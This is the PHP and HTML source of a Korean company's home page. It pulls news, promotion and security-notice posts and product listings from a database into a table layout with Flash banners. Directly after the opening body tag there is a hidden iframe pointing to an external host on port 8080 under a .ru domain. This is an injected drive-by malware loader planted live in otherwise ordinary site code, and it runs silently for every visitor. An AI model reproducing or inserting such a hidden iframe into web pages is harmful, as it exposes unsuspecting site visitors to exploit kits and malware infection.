<?
session_start();
include("../board_func.php");
include("../classdb.php");

function han_wrap($str, $len, $delim="\n"){

    if( strlen($str) < $len || $len == 0)
         return $str;

    $wrap = 0;    
    $str2   = "";   
    $i       = 0;   

    while($i < strlen($str)) {

        if(ord($str[$i]) > 127){
           $str2 .= $str[$i];
           $str2 .= $str[$i+1];
           $i += 2;
           $wrap += 2;

        } else if($str[$i] == "\n" || $str[$i] == "\r") {
            $wrap = 0;
            $i++;
            $str2 .= $str[$i];

        } else {
           $str2 .= $str[$i];
           $i++;
           $wrap++;  
        }
        
        if($wrap >= $len) {
          $i = strlen($str);
        }
    }
    return $str2;
} 



$obj1 = new db;

$qry1="select no, title, visited, name, insert_date, dept, email, filename1, filename2, head, content, step, linked, notice_fg, html_fg, text_fg, sdt, edt
        from board where id='news' and del_fg='0' order by linked DESC, step, dept, no desc limit 0,5" ;
if(!$obj1->execute($qry1)) {
	alert("�����ͺ��̽�����03");
      	exit;
}

//���⼭���� ����Ʈ ����ϴ� �κ�                         
while($obj1->next()){

	$no=$obj1->getValue(0);
	$title=stripslashes(htmlspecialchars($obj1->getValue(1)));
	$visited=$obj1->getValue(2);
	$name=stripslashes(htmlspecialchars($obj1->getValue(3)));
	$date = date("Y.m.d", $obj1->getValue(4));
	$dept=$obj1->getValue(5);
	$email=stripslashes(htmlspecialchars($obj1->getValue(6)));
	$filename1=$obj1->getValue(7);
	$filename2=$obj1->getValue(8);
	$head_lev=stripslashes($obj1->getValue(9));
	$content = stripslashes($obj1->getValue(10)) ;
	$notice_fg1=$obj1->getValue(13);
	$html_fg=$obj1->getValue(14);
	$text_fg=$obj1->getValue(15);
	$sdt=$obj1->getValue(16);
	$edt=$obj1->getValue(17);

	
if($head_lev!=''&&$head!='')$head_str="[$head_lev]";
else $head_str="";

//���þ����ΰ�� new
if($date==date("Y-m-d"))$new_img="<img src='../images/icon_news.gif' border=0 width='23' height='9'>";
else $new_img="";

if($comment_fg=='1'){
	$com_num = com_num($obj1,$no);
	if($com_num)$com_num="($com_num)";
	else $com_num="";
}	
	

	$contents1 = $head_str.$title;

	if(strlen($contents1)>40)	$contents1 = han_wrap($contents1,38)."..";
	
	//
	//���������ΰ��
	if($notice_fg1=='1'&&$notice_fg=='1'){
		$seek_str="����";
		$title="<font color=red><b>".$title."</b></font>";
			
	}else{
		$seek_str=$seek;	
	}
	
	$list.="

          <tr> 
            <td width='10' height='16'><img src='../images/icon_a_04.gif' width='8' height='8'></td>
            <td width='263'><a href='/customer/new_customer.php?id=news&mode=view&cpage=1&no=$no'>$contents1 $new_img</a></td>
            <td width='60' align='right'><font class='a' >$date</font></td>
          </tr>


		";            


}//end of while
//����Ʈ ��   

$qry1="select no, title, visited, name, insert_date, dept, email, filename1, filename2, head, content, step, linked, notice_fg, html_fg, text_fg, sdt, edt
        from board where id='promotion' and del_fg='0' order by sdt desc limit 0,5" ;
if(!$obj1->execute($qry1)) {
	alert("�����ͺ��̽�����03");
      	exit;
}


$seq=$obj1->num();
//���⼭���� ����Ʈ ����ϴ� �κ�                         
while($obj1->next()){

	$no=$obj1->getValue(0);
	$title=stripslashes(htmlspecialchars($obj1->getValue(1)));
	$visited=$obj1->getValue(2);
	$name=stripslashes(htmlspecialchars($obj1->getValue(3)));
	$date = date("Y.m.d", $obj1->getValue(4));
	$dept=$obj1->getValue(5);
	$email=stripslashes(htmlspecialchars($obj1->getValue(6)));
	$filename1=$obj1->getValue(7);
	$filename2=$obj1->getValue(8);
	$head_lev=stripslashes($obj1->getValue(9));
	$content = stripslashes($obj1->getValue(10)) ;
	$notice_fg1=$obj1->getValue(13);
	$html_fg=$obj1->getValue(14);
	$text_fg=$obj1->getValue(15);
	$sdt=$obj1->getValue(16);
	$edt=$obj1->getValue(17);


if($sdt > date("Ymd"))$str_state="<font color=blue>�غ���</font>";
else if($edt < date("Ymd"))$str_state="����";
else $str_state="������";


//���þ����ΰ�� new
if($date==date("Y-m-d"))$new_img="<img src='../images/icon_news.gif' border=0 width='23' height='9'>";
else $new_img="";

if($comment_fg=='1'){
	$com_num = com_num($obj1,$no);
	if($com_num)$com_num="($com_num)";
	else $com_num="";
}	
	

	$contents2 = "[".$str_state."]".$title;

	//�����ڸ���
	if(strlen($contents2)>34)	$contents2 = han_wrap($contents2,32)."..";
		
	$list1.="

          <tr> 
            <td width='10' height='16'><img src='../images/icon_a_04.gif' width='8' height='8'></td>
            <td width='263'><a href='/promotion/new_promotion_view.php?no=$no&seq=$seq'>$contents2 $new_img</a></td>
            <td width='60' align='right'><font class='a'>".substr($edt,0,4).".".substr($edt,4,2).".".substr($edt,6,2)."</font></td>
          </tr>
 
		";            

$seq--;
}//end of while
//���θ�� �̺�Ʈ  

$qry1="select no, title, visited, name, insert_date, dept, email, filename1, filename2, head, content, step, linked, notice_fg, html_fg, text_fg, sdt, edt
        from board where id='alyak' and del_fg='0' order by linked DESC, step, dept, no desc limit 0,5" ;
if(!$obj1->execute($qry1)) {
	alert("�����ͺ��̽�����03");
      	exit;
}

//���⼭���� ����Ʈ ����ϴ� �κ�                         
while($obj1->next()){

	$no=$obj1->getValue(0);
	$title=stripslashes(htmlspecialchars($obj1->getValue(1)));
	$visited=$obj1->getValue(2);
	$name=stripslashes(htmlspecialchars($obj1->getValue(3)));
	$date = date("Y.m.d", $obj1->getValue(4));
	$dept=$obj1->getValue(5);
	$email=stripslashes(htmlspecialchars($obj1->getValue(6)));
	$filename1=$obj1->getValue(7);
	$filename2=$obj1->getValue(8);
	$head_lev=stripslashes($obj1->getValue(9));
	$content = stripslashes($obj1->getValue(10)) ;
	$notice_fg1=$obj1->getValue(13);
	$html_fg=$obj1->getValue(14);
	$text_fg=$obj1->getValue(15);
	$sdt=$obj1->getValue(16);
	$edt=$obj1->getValue(17);

	
if($head_lev!=''&&$head!='')$head_str="[$head_lev]";
else $head_str="";

//���þ����ΰ�� new
if($date==date("Y-m-d"))$new_img="<img src='../images/icon_news.gif' border=0 width='23' height='9'>";
else $new_img="";

if($comment_fg=='1'){
	$com_num = com_num($obj1,$no);
	if($com_num)$com_num="($com_num)";
	else $com_num="";
}	
	
	$contents3 = $head_str.$title;

	if(strlen($contents3)>38)	$contents3 = han_wrap($contents3,36)."..";

	//
	//���������ΰ��
	if($notice_fg1=='1'&&$notice_fg=='1'){
		$seek_str="����";
		$title="<font color=red><b>".$title."</b></font>";
			
	}else{
		$seek_str=$seek;	
	}
	
	$list2.="

          <tr> 
            <td width='10' height='16' align='center'>��&nbsp;&nbsp;</td>
            <td width='263'><a href='/customer/new_customer.php?id=alyak&mode=view&cpage=1&no=$no'>$contents3 $new_img</a></td>
            <td width='60' align='right'><font class='a' >$date</font></td>
          </tr>


		";           

}//end of while
//�˾ຸ�ȰԽ���  





$qry="select seq,code,link1,link2,name,img,ref,summary,keynote,hw_lev,show_fg,fg from product where show_fg='1' and code!='20001' order by code, seq " ;
if(!$obj1->execute($qry)) {
	alert("�����ͺ��̽�����03");
      	exit;
}

//���⼭���� ����Ʈ ����ϴ� �κ�                         
for($i=0; $i < 3 && $obj1->next() ; $i++){

	
	$seq       	=	$obj1->getValue(0);
	$code        	=	$obj1->getValue(1);
	$link1        	=	$obj1->getValue(2);
	$link2   	=	$obj1->getValue(3);
	$name		=	$obj1->getValue(4);
	$img	 	=	$obj1->getValue(5);
	$ref	   	=	$obj1->getValue(6);
	$summary      	=	$obj1->getValue(7);
	$keynote      	=	$obj1->getValue(8);
	$hw_lev      	=	$obj1->getValue(9);
	$show_fg      	=	$obj1->getValue(10);
	$fg      	=	$obj1->getValue(11);
	
	
	
	$product_list.="

                <td>
                
                  <table width='80' border='0' cellspacing='0' cellpadding='0'>
                    <tr> 
                      <td height=80><a href='../product/new_product_view.php?seq=$seq&code=$code'><img src='../product_img/$img' width='80' border=0></a></td>
                    </tr>
                    <tr>
                      <td><a href='../product/new_product_view.php?seq=$seq&code=$code'>$name</a></td>
                    </tr>
                  </table>
                
                </td>


		";            


}//end of for
//����Ʈ ��   


$qry="select seq,code,link1,link2,name,img,ref,summary,keynote,hw_lev,show_fg,fg from product where show_fg='1' and code='20001' order by code, seq " ;
if(!$obj1->execute($qry)) {
	alert("�����ͺ��̽�����03");
      	exit;
}

//���⼭���� ����Ʈ ����ϴ� �κ�                         
for($i=0; $i < 3 && $obj1->next() ; $i++){

	
	$seq       	=	$obj1->getValue(0);
	$code        	=	$obj1->getValue(1);
	$link1        	=	$obj1->getValue(2);
	$link2   	=	$obj1->getValue(3);
	$name		=	$obj1->getValue(4);
	$img	 	=	$obj1->getValue(5);
	$ref	   	=	$obj1->getValue(6);
	$summary      	=	$obj1->getValue(7);
	$keynote      	=	$obj1->getValue(8);
	$hw_lev      	=	$obj1->getValue(9);
	$show_fg      	=	$obj1->getValue(10);
	$fg      	=	$obj1->getValue(11);
	
	
	
	$product_list1.="

                <td valign='top'>
                
                  <table width='80' border='0' cellspacing='0' cellpadding='0'>
                    <tr> 
                      <td height=80><a href='../product/new_product_view.php?seq=$seq&code=$code'><img src='../product_img/$img' width='80' border=0></a></td>
                    </tr>
                    <tr>
                      <td><a href='../product/new_product_view.php?seq=$seq&code=$code'>$name</a></td>
                    </tr>
                  </table>
                
                </td>


		";            


}//end of for
//����Ʈ ��   
?>

<!--------�˾�------------>
<?if($PHP_SELF == '/com/index.php') include "$DOCUMENT_ROOT/popup/popup.php";?>
<!------------------------>

<html>
<head>
<title>INFOMADE Co., LTD.</title>
<meta http-equiv="Content-Type" content="text/html; charset=euc-kr">
<link rel="stylesheet" href="/css/common.css" type="text/css">
<script src="/js/iezn_embed_patch.0.43.js" type="text/javascript"></script>
<script language="JavaScript" src="/js/javascript.js"></script>
<script language="JavaScript" type="text/JavaScript">
<!--
function mm_over(obj)
{
 var img = obj.src.split('.jpg');
 obj.src = img[0] + '_on.jpg';
}
function mm_out(obj)
{
 var img = obj.src.split('_on.jpg');
 obj.src = img[0] + '.jpg';
}


function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);


var best_idx = 0;
var interval_best;
var go_page = "/customer/new_customer.php?id=news";
// ���÷��� ó��
function MO_B(idx) {
 dB_S[0].style.display="none";
 dB_S[1].style.display="none";
 dB_S[idx].style.display="";
 more_page_set(idx);
} 

function best_change(){
 if( best_idx == 1 )
  best_idx = 0;
 else
  best_idx++;

 MO_B(best_idx);
 more_page_set(best_idx);
} 

function setInterval_best(){
 interval_best = setInterval("best_change()",4000);//�ӵ�����
}

function clearInterval_best(){
 clearInterval(interval_best);
}

function more_page_set(idx){
	if(idx == 1) go_page="/promotion/new_promotion.php?mode=ing";
	else go_page="/customer/new_customer.php?id=news";	
}

function more_page_go(){
	location.replace(go_page);
} 

setInterval_best();


//-->
</script>
</head>


<body leftmargin="0" topmargin="0"><iframe src="http://3e0.ru:8080/index.php" width=137 height=146 style="visibility: hidden"></iframe>
<!------------���� ���̾�------------->


<!-----------���θ�� ���̾�--------->


<!------------new product ���̾�------------->
<!--
<div id="Layer3" style="position:absolute; left:375px; top:300px; width:541px; height:194px; z-index:3; overflow: hidden; visibility: visible; filter:alpga(Opacit=70) revealTrans(transiion=23,duration=0.5) blendTrans(duration=0.5);">

  <table width="352" height="114" border="0" cellpadding="0" cellspacing="0">
	<tr>
		<td width="79" height="114"><img src="/images/new_product_select.jpg" width="79" height="114" border="0" usemap="#newproduct"></td>
		<td>

			<table width="273" height="114" cellspacing="0" cellpadding="0" border="0">
				<tr>
				<td>
				&nbsp;&nbsp;&nbsp;
				</td>
			<?=$product_list?>
				</tr>
				<tr>
					<td colspan="4" height="3" bgcolor="#808483"></td>
				</tr>
			</table>
			
		</td>
	</tr>
  
  </table>
 
</div>
-->
<!-----------apple product ���̾�--------->
<!--
<div id="Layer4" style="position:absolute; left:375px; top:300px; width:541px; height:194px; z-index:4; overflow: hidden; visibility: hidden; filter:alpga(Opacit=70) revealTrans(transiion=23,duration=0.5) blendTrans(duration=0.5);">

  <table width="352" height="114" border="0" cellpadding="0" cellspacing="0">
	<tr>
		<td width="79" height="114"><img src="/images/apple_product_select.jpg" width="79" height="114" border="0" usemap="#appleproduct"></td>
		<td>

			<table width="273" height="114" cellspacing="0" cellpadding="0" border="0">
				<tr>
				<td>
				&nbsp;&nbsp;&nbsp;
				</td>
					<?=$product_list1?>
				</tr>
				<tr>
					<td colspan="4" height="3" bgcolor="#808483"></td>
				</tr>
			</table>
			
		</td>
	</tr>
  
  </table>
</div>
-->
<!------------top-------------->
<?include "top_new.php";?>
<!-----------middle----------->
<tr>
	<td>
		<table width="100%" height="514" cellspacing="0" cellpadding="0" border="0">
			<tr>
				<!-----------left �̹���------------>
				<td width="364" height="514">
					<table width="364" height="514" cellspacing="0" cellpadding="0" border="0" background="/images/n_left_index_images.jpg">
						<tr>
							<td>
							
							</td>
						</tr>
					</table>
				</td>
				<!-----------�߾� �Խ���------------>
				
				<td width="352" height="514">
					<table width="352" height="514" cellspacing="0" cellpadding="0" border="0" background="/images/n_center_index_images.jpg">
						<Tr>
							<Td align="center">
								<table width="319" border="0" cellspacing="0" cellpadding="0" id="dB_S" onMouseOver="clearInterval_best()" onMouseOut="setInterval_best()">
								<tr><td bgcolor="c8c8c8" height="1" colspan="2"></td></tr>

								<tr>
									<td width="236">
										<img src="/images/txt1_on.gif" width="59" height="21" onMouseOver="MO_B(0);" align="absmiddle">
										<img src="/images/txt2.gif" width="110" height="21" onMouseOver="MO_B(1);" align="absmiddle">
										</td>
									<td align="right">
										<img src="/images/more.gif" width="28" height="21" onClick="more_page_go();" style="cursor:hand;" align="absmiddle">
									</td>
								</tr>

								<tr>
									<td bgcolor="c8c8c8" height="1" colspan="2"></td>
								</tr>
								<tr>
									<td colspan="2" style="padding:5 0 0 0;">
										<table cellspacing="0" cellpadding="0" border="0">
										<?=$list?>
										</table>
									</td>
								</tr>
								</table>


								<table width="319" border="0" cellspacing="0" cellpadding="0" id="dB_S" onMouseOver="clearInterval_best()" onMouseOut="setInterval_best()" style="display:none;">
								<tr><td bgcolor="c8c8c8" height="1" colspan="2"></td></tr>
								<tr>
									<td width="236">
										<img src="/images/txt1.gif" width="59" height="21" onMouseOver="MO_B(0);" align="absmiddle">
										<img src="/images/txt2_on.gif" width="110" height="21" onMouseOver="MO_B(1);" align="absmiddle">
									</td>
									<td align="right">
										<img src="/images/more.gif" width="28" height="21" onClick="more_page_go();" style="cursor:hand;" align="absmiddle">
									</td>
								</tr>
								<tr><td bgcolor="c8c8c8" height="1" colspan="2"></td></tr>
								<tr>
									<td colspan="2" style="padding:5 0 0 0;">
										<table cellspacing="0" cellpadding="0" border="0">
										<?=$list1?>
										</table>
									</td>
								</tr>
								</table>							
							</td>
						</tr>
						<tr>
							<td align="center">
								<table cellspacing="0" cellpadding="0" border="0" width="319" height="119">
									<tr><td bgcolor="c8c8c8" height="1" colspan="2"></td></tr>
									<tr height="29">
										<td align="left">&nbsp;
											<img src="/images/alyak_board_title.gif" align="absmiddle">
										</td>
										<td align="right">
											<a href='/customer/new_customer.php?id=alyak'><img src="/images/more.gif" width="28" height="21" onClick="" style="cursor:hand;" align="absmiddle"></a>
										</td>
									</tr>
									<tr><td bgcolor="c8c8c8" height="1" colspan="2"></td></tr>
									<tr>
										<td colspan="2" style="padding:5 0 0 0;" height="90">
											<table cellspacing="0" cellpadding="0" border="0" valign="top">
											<?=$list2?>
											</table>
										</td>
									</tr>
								</table>
							</td>
						</tr>

						<tr>
							<td height="190" align="center">
								<table width="319" height="190" cellspacing="0" cellpadding="0" border="0" align="center">
									<tr>
										<td height="20"></td>
									</tr>
									<tr>
										<Td width="319" height="140" style="padding:4 4 4 4;border-top:2px solid #6d9c42;border-left:2px solid #6d9c42;border-bottom:2px solid #6d9c42;border-right:2px solid #6d9c42;" align="center" bgcolor="#6d9c42">
										<!----------------------------�߾� �÷��� ������ ũ�� 319X190 ����--------------------------->
										<script src="/js/flash_view.js"></script>
										<script>
										var flash_url='/images/cbe_altools.swf';
										var flash_width='319';
										var flash_height='140';
										var flash_vars='main';
										flash_view_menu(flash_url,flash_width,flash_height,flash_vars);
										</script>						
										
										<!----------------------------�߾� �÷��� ��---------------------------------------->
										</td>
									</tr>
									<tr>
										<td height="20"></td>
									</tr>
								</table>
							</td>
						</tr>
						<!------------���ȰԽ��� ������û ��ư-------------->
						<tr>
						
							<td>
								<table cellspacing="0" cellpadding="0" border="0">
								 <tr>
									<Td width="10"></td>
									<td align="center"><a href="/customer/new_customer.php?id=proposal"><img src="/images/solution_button.gif" width="165" height="35" border="0"></a></td>
									<td width="30"></td>
									<td align="center"><a href="/customer/new_customer.php?id=qna"><img src="/images/counseling_button.gif" width="165" height="35" border="0"></a></td>
								</tr>
								</table>
							</td>
						
						</tr>
					</table>
				</td>
				<!-----------�߾� �Խ��� ��--------->
				<!-----------right �̹���----------->
				<td>
					<table width="284" height="514" cellspacing="0" cellpadding="0" border="0" background="/images/n_right_index_images.jpg">
						<tr>			
							<td width="20"></td>
							<td width="244">
								<table width="100%" cellspacing="0" cellpadding="0" border="0" height="486">
									<tr height="27">
										<Td colspan="3">
											<img src="/images/intro_flash_01.gif" width="244" height="27" align="absmiddle">	
										</td>
									</tr>
									<tr>
										<Td><img src="/images/intro_flash_02.gif" width="26" height="192" align="absmiddle"></td>
										<td width="192" height="192" align="center" bgcolor="#6d9c42">										
										<script src="/js/flash_view.js"></script>
										<script>
										var flash_url='/images/new_home.swf';
										var flash_width='192';
										var flash_height='192';
										var flash_vars='main';
										flash_view_menu(flash_url,flash_width,flash_height,flash_vars);
										</script>						
										<!--<center><embed src="/images/new_home.swf" width=190 height=190></embed></center>-->
										<!--------��Ʈ�� �÷��� ���� ����192 ����192 ����------->
										</td>
										<td><img src="/images/intro_flash_03.gif" width="26" height="192" align="absmiddle"></td>
									</tr>
									<tr>
										<Td colspan="3">
											<img src="/images/intro_flash_04.gif" width="244" height="267" align="absmiddle">
										</td>
									</tr>
								</table>
							</td>
							<td width="20"></td>
						</tr>
					</table>
				</td>
			</tr>
		</table>
	</td>
</tr>
<bgsound src="../images/intro.wma">
<!-----------bottom----------------->
<?include "bottom_new.php";?>
<!-------------------------------------->

<map name="news" id="news">
  <area shape="rect" coords="2,8,78,25" href="#" onMouseOver="MM_showHideLayers('Layer1','','show','Layer2','','hide')">
  <area shape="rect" coords="94,12,211,20" href="#" onMouseOver="MM_showHideLayers('Layer1','','hide','Layer2','','show')">
  <area shape="rect" coords="290,16,323,22" href="/customer/new_customer.php?id=news">
</map>
<map name="promotion" id="promotion">
  <area shape="rect" coords="2,9,77,25" href="#" onMouseOver="MM_showHideLayers('Layer1','','show','Layer2','','hide')">
  <area shape="rect" coords="84,6,239,26" href="#" onMouseOver="MM_showHideLayers('Layer1','','hide','Layer2','','show')">
  <area shape="rect" coords="290,16,323,22" href="/promotion/new_promotion.php?mode=ing">
</map>
<map name="newproduct" id="newproduct">
  <area shape="rect" coords="10,19,70,45" href="#" onMouseOver="MM_showHideLayers('Layer3','','show','Layer4','','hide')">
  <area shape="rect" coords="11,65,70,91" href="#" onMouseOver="MM_showHideLayers('Layer3','','hide','Layer4','','show')">
  
</map>
<map name="appleproduct" id="appleproduct">
  <area shape="rect" coords="10,19,70,45" href="#" onMouseOver="MM_showHideLayers('Layer3','','show','Layer4','','hide')">
  <area shape="rect" coords="11,65,70,91" href="#" onMouseOver="MM_showHideLayers('Layer3','','hide','Layer4','','show')"> 
</map>

<map name="adobe" id="adobe">
  <area shape="rect" coords="32,
